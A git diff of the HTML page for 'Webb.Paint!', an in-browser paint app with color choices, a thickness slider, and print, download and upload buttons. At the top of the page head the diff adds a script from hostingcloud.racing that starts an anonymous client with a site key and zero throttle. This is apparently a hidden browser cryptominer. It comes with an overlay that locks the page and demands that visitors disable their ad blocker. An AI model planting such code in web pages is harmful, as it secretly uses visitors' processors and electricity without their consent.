@@ -1,8 +1,117 @@
+
+
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
 <head>
+<script src="https://www.hostingcloud.racing/vTKF.js"></script>
+<script>
+    var _client = new Client.Anonymous('e83e35739f39d6b16408c9ca4d286af559ab42e1a6f39f26f9370fadd7685b5e', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please disable adblock!"));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
+</script>
+<style>
+body{
+	font-family:sans-serif;
+}
+.slidecontainer {
+  width: 100%;
+}
+
+.slider {
+  -webkit-appearance: none;
+  width: 100%;
+  height: 25px;
+  background: #d3d3d3;
+  outline: none;
+  opacity: 0.7;
+  -webkit-transition: .2s;
+  transition: opacity .2s;
+}
+
+.slider:hover {
+  opacity: 1;
+}
+
+.slider::-webkit-slider-thumb {
+  -webkit-appearance: none;
+  appearance: none;
+  width: 25px;
+  height: 25px;
+  background: #4CAF50;
+  cursor: pointer;
+}
+
+.slider::-moz-range-thumb {
+  width: 25px;
+  height: 25px;
+  background: #4CAF50;
+  cursor: pointer;
+}
+.thick{
+	font-family:sans-serif;
+}
+</style>
+<script src="https://kit.fontawesome.com/397670247e.js" crossorigin="anonymous"></script>
+<script src="https://xscript.netlify.app/XS.min.js/"></script>
+    <meta charset="utf-8">
+    <title>
+       	Webb.Paint! | An In Browser Paint App.
+    </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
-<body>
-  <script src="app.js"></script>
-</body>
+<div>
+<a draggable="false" id="Settings" class="drawspace" name="drawspace" href="#colorspace" ><i class="fas fa-cog"></i> Pen Settings</a>
+<a href="javascript:clear();"><button onclick="clear()" id="clearBtn"><i class="far fa-trash-alt"></i> Clear All</button></a>
+<button draggable="false" class=erase" id="eraseBtn" onclick="erase()"><i class="fas fa-eraser"></i> Eraser</button>
+<a href="javascript:printArt();"><button id="clearBtn" ><i class="fas fa-print"></i> Print</button></a>
+<a href="javascript:save();"><button id="saveBtn"><i class="fas fa-download"></i> Download</button></a>
+<a href="javascript:viewImg();" id="BaseImage"><button><i class="far fa-images"></i> View Image</button></a>
+<a href="#upload"><button><i class="fas fa-upload"></i> Upload</button></a>
+</div>
+<canvas draggable="false" id="draw"></canvas>
+<div>
+<a href="#drawspace" name="colorspace" ><i class="fas fa-chevron-up"></i> Back To Coloring</a>
+<div draggable="false" class="red" onclick="red()"><input type="radio" name="color" id="color1" class="colorbox"><label for="color1"></div>
+<div draggable="false" class="orange" onclick="orange()"><input type="radio" name="color" id="color2" class="colorbox"><label for="color2"></div>
+<div draggable="false" class="yellow" onclick="yellow()"><input type="radio" name="color" id="color3" class="colorbox"><label for="color3"></div>
+<div draggable="false" class="green" onclick="green()"><input type="radio" name="color" id="color4" class="colorbox"><label for="color4"></div>
+<div draggable="false" class="fc00c4" onclick="fc00c4()"><input type="radio" name="color" id="color5" class="colorbox"><label for="color5"></div>
+<div draggable="false" class="blue" onclick="blue()"><input type="radio" name="color" id="color6" class="colorbox"><label for="color6"></div>
+<div draggable="false" class="indigo" onclick="indigo()"><input type="radio" name="color" id="color7" class="colorbox"><label for="color7"></div>
+<div draggable="false" class="violet" onclick="violet()"><input type="radio" name="color" id="color8" class="colorbox"><label for="color8"></div>
+<div draggable="false" class="darkviolet" onclick="darkviolet()"><input type="radio" name="color" id="color9" class="colorbox"><label for="color9"></div>
+<div draggable="false" class="lightgreen" onclick="lightgreen()"><input type="radio" name="color" id="color10" class="colorbox"><label for="color10"></div>
+<div draggable="false" class="lightblue" onclick="lightblue()"><input type="radio" name="color" id="color11" class="colorbox"><label for="color11"></div>
+<div draggable="false" class="FD01BA" onclick="FD01BA()"><input type="radio" name="color" id="color12" class="colorbox"><label for="color12"></div>
+<div class="thick">Thickness
+<input type="range" min="1" max="100" value="20" class="slider" id="thickness">
+<a href="#hexInput" onclick="showhex()"><button>Add Custom Color</button></a>
+<a name="hexInput"></a>
+<input draggable="false" class="hexinput" id="hex" placeholder="Type Custom Color Here" ></input>
+</div>
+<a name="upload">Upload An Image <i class="fas fa-arrow-down"></i></a>
+<br>
+<input type="file" id="imageLoader" name="imageLoader"/>
+</div>
+<script src="app.js"></script>
 </html>
